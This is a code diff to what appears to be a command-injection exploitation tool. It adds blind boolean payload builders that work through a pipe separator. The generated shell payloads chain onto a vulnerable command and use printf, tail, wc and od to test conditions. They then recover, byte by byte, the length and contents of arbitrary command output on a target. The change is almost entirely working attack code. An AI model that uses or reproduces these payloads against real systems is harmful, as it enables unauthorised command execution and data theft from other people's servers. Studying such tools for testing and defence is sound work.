@@ -33,16 +33,22 @@ The separators a question can be asked with using nothing but themselves.
 '||' would need a bare pipe to index the output - a second separator either way. Rather than reach
 for one, neither is asked at all: a boundary is only worth reporting if the target was shown to
 accept the separator the payload is actually made of.
+
+A pipe is among them, and carries an answer either way one can be read. Off the exit status, by
+being left unterminated: a pipeline ending in a test is already a whole command, and the no-operation
+that would otherwise close it answers 0 whatever the test said. Printed, by printing the marker
+through the pipe itself and taking it from the byte the comparison picks - which needs no 'if', and
+so no ';' to put before its 'then'.
 """
 SUPPORTED_SEPARATORS = (";", "\n", "\r\n", "&&", "|")
+
+# The same comparison, written the way arithmetic spells it - what a pipe needs, having
+# no 'if' to put a test inside of.
+_ARITHMETIC = {"-eq": "==", "-le": "<=", "-ge": ">=", "-gt": ">", "-lt": "<", "-ne": "!="}
 
 def _supported(separator):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     return checks.windows_separator(separator) is not None
-  # A printed answer needs somewhere to hang the printing off, which a bare pipe has not got: 'if'
-  # wants a ';' before its 'then', and '&&' is a separator of its own.
-  if settings.BOOLEAN_PRINTED_STATE and separator == "|":
-    return False
   return separator in SUPPORTED_SEPARATORS
 
 """
@@ -54,7 +60,7 @@ answer and the test is left bare. Where it does not - a page that prints what th
 whatever it said - the same test is made to print an unguessable marker, and the page then carries
 that marker or it does not. Which of the two is in use is settled per target, by trying the first.
 """
-def _decide(separator, expression):
+def _decide(separator, expression, arithmetic=None):
   if not settings.BOOLEAN_PRINTED_STATE:
     return _test(expression)
   printing = "echo " + settings.BOOLEAN_MARKER
@@ -63,7 +69,36 @@ def _decide(separator, expression):
     return _test(expression) + separator + printing
   if separator in (";", settings.END_LINE.LF, settings.END_LINE.CRLF):
     return "if " + _test(expression) + separator + "then " + printing + separator + "fi"
+  if separator == settings.PIPE_SEPARATOR and arithmetic:
+    return _printed_through_pipe(arithmetic)
   return ""
+
+"""
+The marker printed down the pipe the payload is already proving, or nothing printed at all.
+
+Nothing is chained to say which: the marker is written out whole and then taken from the byte the
+comparison itself picks - its first where the answer is yes, and one past its last where the answer
+is no, which leaves nothing to take. 'head -c 0' would say the same thing and is not portable: it
+is a count some builds refuse outright.
+"""
+def _printed_through_pipe(arithmetic):
+  marker = settings.BOOLEAN_MARKER
+  return ("printf '%s' " + marker + settings.PIPE_SEPARATOR + "tail -c +$(( (" + arithmetic +
+          ") ? 1 : " + str(len(marker) + 1) + " ))")
+
+"""
+The output measured and indexed down the pipe itself, where no variable survives to hold it.
+
+A pipe runs each side in a shell of its own, so a variable set on the left is gone by the time the
+right reads it - what the other separators keep in one is read here as it is needed. The byte is
+counted rather than read as a character, so a build whose 'printf' signs it answers the same.
+"""
+def _piped_length(word):
+  return "$(printf '%s' \"" + word + "\"" + settings.PIPE_SEPARATOR + "wc -c)"
+
+def _piped_ordinal(word, num_of_chars):
+  return ("$(printf '%s' \"" + word + "\"" + settings.PIPE_SEPARATOR + "tail -c +" + str(num_of_chars) +
+          settings.PIPE_SEPARATOR + "head -c 1" + settings.PIPE_SEPARATOR + "od -A n -t u1)")
 
 """
 The command's output held in a variable, and cut down to the byte being asked about.
@@ -87,7 +122,9 @@ def condition_check(separator, holds=True):
   if settings.TARGET_OS == settings.OS.WINDOWS:
     chain = checks.windows_separator(separator)
     return checks.windows_boolean_probe(chain, "echo 1", "EQU", "1" if holds else "2")
-  return checks.terminate_payload(separator + _decide(separator, "1 -eq " + ("1" if holds else "2")), separator)
+  known = "1" if holds else "2"
+  payload = separator + _decide(separator, "1 -eq " + known, arithmetic="1==" + known)
+  return checks.terminate_payload(payload, separator, keep_output=separator == settings.PIPE_SEPARATOR)
 
 """
 The decision payload, which asks the target to print something unguessable and measure it.
@@ -109,12 +146,15 @@ def decision(separator, TAG, output_length, holds=True):
       "EQU", expected)
   word = tb_payloads._output_word("echo " + TAG)
   var = settings.RANDOM_VAR_GENERATOR
-  if separator == "|":
-    payload = separator + _decide(separator, "$(printf '%s' \"" + word + "\" | wc -c)" + settings.SINGLE_WHITESPACE + "-eq" + settings.SINGLE_WHITESPACE + expected)
+  if separator == settings.PIPE_SEPARATOR:
+    measured = _piped_length(word)
+    payload = separator + _decide(separator, measured + settings.SINGLE_WHITESPACE + "-eq" +
+                                  settings.SINGLE_WHITESPACE + expected,
+                                  arithmetic=measured + "==" + expected)
   else:
     payload = (separator + var + "=\"" + word + "\"" + separator +
                _decide(separator, "${#" + var + "}" + settings.SINGLE_WHITESPACE + "-eq" + settings.SINGLE_WHITESPACE + expected))
-  return checks.terminate_payload(payload, separator)
+  return checks.terminate_payload(payload, separator, keep_output=separator == settings.PIPE_SEPARATOR)
 
 """
 How many bytes the command's output is, asked as a comparison so that it can be bisected.
@@ -135,13 +175,15 @@ def get_length(separator, cmd, candidate_length, operator="-eq"):
     return checks.windows_boolean_probe(chain,
       "powershell.exe -InputFormat none write ([string](cmd /c " + cmd + ")).trim().length",
       {"-eq": "EQU", "-ge": "GEQ", "-le": "LEQ"}.get(operator, "EQU"), candidate_length)
-  if separator == "|":
-    # The separator is itself a pipe, so the measurement may be one - and needs no variable.
-    payload = separator + _decide(separator, "$(printf '%s' \"" + word + "\" | wc -c)" + settings.SINGLE_WHITESPACE +
-                                operator + settings.SINGLE_WHITESPACE + str(candidate_length))
+  if separator == settings.PIPE_SEPARATOR:
+    measured = _piped_length(word)
+    payload = separator + _decide(separator, measured + settings.SINGLE_WHITESPACE + operator +
+                                  settings.SINGLE_WHITESPACE + str(candidate_length),
+                                  arithmetic=measured + _ARITHMETIC[operator] + str(candidate_length))
   else:
-    payload = separator + var + "=\"" + word + "\"" + separator + compare
-  return checks.terminate_payload(payload, separator)
+    # Counted in bytes, as the reading beside it indexes - exported, since a rewrite can move the counting into a command of its own.
+    payload = separator + settings.BYTE_LOCALE_EXPORTED + separator + var + "=\"" + word + "\"" + separator + compare
+  return checks.terminate_payload(payload, separator, keep_output=separator == settings.PIPE_SEPARATOR)
 
 """
 Whether the ordinal of the output's Nth byte is at or above this one, which is what bisects it.
@@ -150,7 +192,7 @@ def get_char(separator, cmd, num_of_chars, ascii_char, operator="-le"):
   word = tb_payloads._output_word(cmd)
   qmarks = "?" * (num_of_chars - 1)
   var = settings.RANDOM_VAR_GENERATOR
-  var_ordinal = "$(printf '%d' \"'${" + var + "}\")"
+  var_ordinal = checks.byte_ordinal("${" + var + "}")
   compare = lambda expression, op: _decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + op + settings.SINGLE_WHITESPACE + expression)
 
   if not _supported(separator):
@@ -163,12 +205,14 @@ def get_char(separator, cmd, num_of_chars, ascii_char, operator="-le"):
       "powershell.exe -InputFormat none write ([int][char](([string](cmd /c " + cmd + ")).trim().substring(" +
       str(num_of_chars - 1) + ",1)))",
       "GEQ" if operator == "-le" else "EQU", ascii_char)
-  if separator == "|":
-    # A pipe indexes the output without a variable, which is what lets this stay one separator.
-    piped = ("$(printf '%d' \"'$(printf '%s' \"" + word + "\" | tail -c +" + str(num_of_chars) + " | head -c 1)\")")
-    payload = separator + compare(piped, operator)
+  if separator == settings.PIPE_SEPARATOR:
+    piped = _piped_ordinal(word, num_of_chars)
+    payload = separator + _decide(separator, str(ascii_char) + settings.SINGLE_WHITESPACE + operator +
+                                  settings.SINGLE_WHITESPACE + piped,
+                                  arithmetic=str(ascii_char) + _ARITHMETIC[operator] + piped)
   else:
-    payload = separator + _var_chain(separator, word, qmarks) + compare(var_ordinal, operator)
-  return checks.terminate_payload(payload, separator)
+    # Sliced in bytes, as the length beside it counts - exported, since a rewrite can move the counting into a command of its own.
+    payload = separator + settings.BYTE_LOCALE_EXPORTED + separator + _var_chain(separator, word, qmarks) + compare(var_ordinal, operator)
+  return checks.terminate_payload(payload, separator, keep_output=separator == settings.PIPE_SEPARATOR)
 
 # eof
